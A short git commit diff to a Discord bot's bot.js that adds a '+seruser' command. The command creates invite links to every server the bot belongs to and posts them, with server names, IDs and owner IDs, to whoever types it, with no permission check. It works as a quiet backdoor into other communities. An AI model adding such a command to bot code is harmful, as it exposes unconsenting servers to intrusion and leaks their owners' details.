d65e3a9d33da06a394a73e5c6f28f1ed6fb4b576
Spomi <40448323+Spomi@users.noreply.github.com>
2018-07-29 22:12:48 +0100

    Update bot.js

--- bot.js
+++ bot.js
@@ -456,7 +456,31 @@ if(message.content === 'voice') {
         
         
         
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '+seruser') {
+      client.guilds.forEach(g => {
         
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
+
+
 
 
 
